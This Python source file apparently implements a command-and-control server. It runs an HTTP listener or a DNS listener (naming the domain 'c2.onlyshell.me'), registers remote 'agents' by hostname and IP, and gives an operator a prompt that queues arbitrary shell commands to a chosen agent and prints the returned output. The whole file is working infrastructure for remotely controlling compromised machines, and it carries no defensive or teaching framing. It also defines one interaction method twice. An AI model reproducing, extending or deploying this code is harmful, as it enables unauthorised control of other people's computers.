import socket
import sys
import os
import shlex
import time # For splitting commands robustly

# Ensure the core and utils directories are in the Python path
# This allows us to import modules like 'db_manager' and 'logger'
sys.path.append(os.path.join(os.path.dirname(__file__), 'core'))
sys.path.append(os.path.join(os.path.dirname(__file__), 'database'))
sys.path.append(os.path.join(os.path.dirname(__file__), 'utils'))

# Import modules (will be created in subsequent steps)
from logger import setup_logger
from db_manager import DBManager 
from modules.dns_listener import DNSListener 
from modules.http_listener import HTTPListener # NEW Import for HTTP Listener


# Set up logging
logger = setup_logger('c2_server', 'server.log')

COMMUNICATION_METHOD = "HTTP"

class C2Server:
    def __init__(self):
        self.db_path = os.path.join(os.path.dirname(__file__), 'database', 'c2.db')
        self.db_manager = DBManager(self.db_path)
        logger.info(f"C2 Server initializing. Database at: {self.db_path}")
        self.db_manager.initialize_db()

        self.agents = {} # In-memory cache for active agents {agent_id: agent_object}
        self.listener = None # To hold the active communication listener instance

        if COMMUNICATION_METHOD == "HTTP":
            # HTTP Listener Configuration
            self.http_host = "0.0.0.0" # Listen on all available interfaces
            self.http_port = 8080      # Choose an unprivileged port for initial testing
            logger.info(f"Using HTTP Listener on {self.http_host}:{self.http_port}")
            self.listener = HTTPListener(self.http_host, self.http_port, self.db_manager)

        elif COMMUNICATION_METHOD == "DNS":
            # DNS Listener Configuration
            # IMPORTANT: REPLACE THESE WITH YOUR ACTUAL DOMAIN AND C2 SERVER'S PUBLIC IP
            self.c2_domain = "c2.onlyshell.me" # e.g., "command.yourdomain.com"
            self.c2_ip = "YOUR_C2_SERVER_PUBLIC_IP" # Replace with your C2 server's public IP
            # If you want to try auto-determining the IP (less reliable for production):
            # try:
            #     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            #     s.connect(("8.8.8.8", 80))
            #     self.c2_ip = s.getsockname()[0]
            #     s.close()
            #     logger.info(f"Automatically determined C2 Server IP for DNS: {self.c2_ip}")
            # except Exception as e:
            #     logger.warning(f"Could not auto-determine C2 IP for DNS, defaulting to 127.0.0.1. Error: {e}")
            #     self.c2_ip = "127.0.0.1"

            logger.info(f"Using DNS Listener for domain: {self.c2_domain} at IP: {self.c2_ip}")
            self.listener = DNSListener(self.c2_domain, self.c2_ip, self.db_manager)

        else:
            logger.critical(f"Unknown COMMUNICATION_METHOD: {COMMUNICATION_METHOD}. Exiting.")
            sys.exit(1) # Exit if invalid method is specified
    def _help_command(self):
        """Displays available commands."""
        print("\nAvailable commands:")
        print("  help              - Display this help message.")
        print("  agents            - List all registered agents.")
        print("  interact <agent_id> - Interact with a specific agent.")
        print("  exit              - Shut down the C2 server.")
        print("  clear             - Clear the console.")
        print("") # For spacing

    def _list_agents(self):
        """Lists all agents from the database."""
        logger.info("Listing all agents.")
        agents_data = self.db_manager.get_all_agents()
        if not agents_data:
            print("No agents currently registered.")
            return

        print("\nRegistered Agents:")
        print("-" * 50)
        print(f"{'ID':<5} {'Hostname':<20} {'IP Address':<15} {'Last Check-in':<20}")
        print("-" * 50)
        for agent in agents_data:
            print(f"{agent['id']:<5} {agent['hostname']:<20} {agent['ip_address']:<15} {agent['checkin_time']:<20}")
        print("-" * 50)

    def _interact_with_agent(self, agent_id):
        """Placeholder for interacting with a specific agent."""
        logger.info(f"Attempting to interact with agent: {agent_id}")
        agent = self.db_manager.get_agent_by_id(agent_id)
        if not agent:
            print(f"Agent with ID '{agent_id}' not found.")
            return

        print(f"\nInteracting with Agent ID: {agent_id} (Hostname: {agent['hostname']})")
        print("Type 'back' to return to main prompt.")
        # This will be replaced with actual interaction logic later
        # For now, it's a sub-prompt that just echoes
        while True:
            try:
                command = input(f"C2({agent_id})> ").strip()
                if command.lower() == 'back':
                    print(f"Returning to main prompt.")
                    break
                elif not command:
                    continue
                else:
                    print(f"Executing command on agent {agent_id}: '{command}' (Not yet implemented)")
                    # In a real scenario, this would send command to agent via comms module
            except KeyboardInterrupt:
                print("\nExiting agent interaction.")
                break


    def start_cli(self):
        """Starts the interactive C2 CLI."""
        print("Starting C2 Server CLI...")
        print("Type 'help' for a list of commands.")

        if self.listener:
            self.listener.start() # Start the chosen listener
            logger.info(f"{COMMUNICATION_METHOD} Listener started as part of C2 server.")
        else:
            logger.error("No communication listener configured or started. Check COMMUNICATION_METHOD.")

        while True:
            try:
                command_line = input("C2> ").strip()
                if not command_line:
                    continue

                parts = shlex.split(command_line)
                command = parts[0].lower()
                args = parts[1:]

                if command == 'help':
                    self._help_command()
                elif command == 'agents':
                    self._list_agents()
                elif command == 'interact':
                    if len(args) == 1:
                        self._interact_with_agent(args[0])
                    else:
                        print("Usage: interact <agent_id>")
                elif command == 'exit':
                    logger.info("Shutting down C2 server.")
                    if self.listener:
                        self.listener.stop() # Stop the active listener
                    print("Shutting down C2 server. Goodbye!")
                    break
                elif command == 'clear':
                    os.system('cls' if os.name == 'nt' else 'clear')
                else:
                    print(f"Unknown command: '{command}'. Type 'help' for available commands.")
            except EOFError:
                print("\nReceived EOF. Exiting C2 server.")
                break
            except KeyboardInterrupt:
                print("\nCtrl+C detected. Type 'exit' to shut down gracefully.")
            except Exception as e:
                logger.error(f"An unexpected error occurred in CLI: {e}", exc_info=True)
                print(f"An error occurred: {e}")
                
    def _interact_with_agent(self, agent_identifier):
        """
        Allows interaction with a specific agent.
        Tasks are added to the DB and polled for completion.
        """
        try:
            agent = self.db_manager.get_agent_by_id(agent_identifier)
            if not agent:
                print(f"Agent with ID '{agent_identifier}' not found.")
                logger.warning(f"Attempted interaction with non-existent agent ID: {agent_identifier}")
                return

            print(f"Interacting with Agent ID: {agent['id']} (Hostname: {agent['hostname']})")
            print("Type 'back' to return to main prompt.")

            while True:
                try:
                    command_line = input(f"C2({agent['id']})> ").strip()
                    if not command_line:
                        continue

                    if command_line.lower() == 'back':
                        print(f"Exiting interaction with Agent ID: {agent['id']}")
                        break

                    logger.info(f"Executing command on agent {agent['id']}: '{command_line}'")
                    print(f"Executing command on agent {agent['id']}: '{command_line}'")

                    # Add the task to the database
                    task_id = self.db_manager.add_task(agent['id'], command_line)

                    if task_id:
                        print(f"Task {task_id} queued. Waiting for agent output (max 60s timeout)...")
                        # Poll for task completion
                        timeout_start = time.time()
                        max_timeout = 60 # seconds
                        poll_interval = 1 # seconds

                        while time.time() - timeout_start < max_timeout:
                            task = self.db_manager.get_task_by_id(task_id)
                            if task and task['status'] == 'completed':
                                print(f"\n--- Output for Task {task_id} ---")
                                print(task['output'])
                                print("----------------------------")
                                break
                            elif task and task['status'] == 'failed':
                                print(f"\n--- Task {task_id} FAILED ---")
                                print(task['output'] if task['output'] else "[No error output]")
                                print("--------------------------")
                                break
                            time.sleep(poll_interval)
                        else:
                            print(f"\n[!] Task {task_id} timed out after {max_timeout} seconds. Agent may be offline or task processing is slow.")
                            # Optionally update task status to 'timed_out' in DB
                            self.db_manager.update_task_status(task_id, 'timed_out')
                    else:
                        print(f"Error: Could not add task to database for agent {agent['id']}.")

                except KeyboardInterrupt:
                    print("\n[!] Interaction interrupted. Type 'back' to exit interaction or Ctrl+C again to exit server.")
                except Exception as e:
                    logger.error(f"An error occurred during agent interaction: {e}", exc_info=True)
                    print(f"[!] An error occurred: {e}")

        except Exception as e:
            logger.error(f"Error setting up interaction with agent {agent_identifier}: {e}", exc_info=True)
            print(f"Error: {e}")

if __name__ == "__main__":
    server = C2Server()
    server.start_cli()
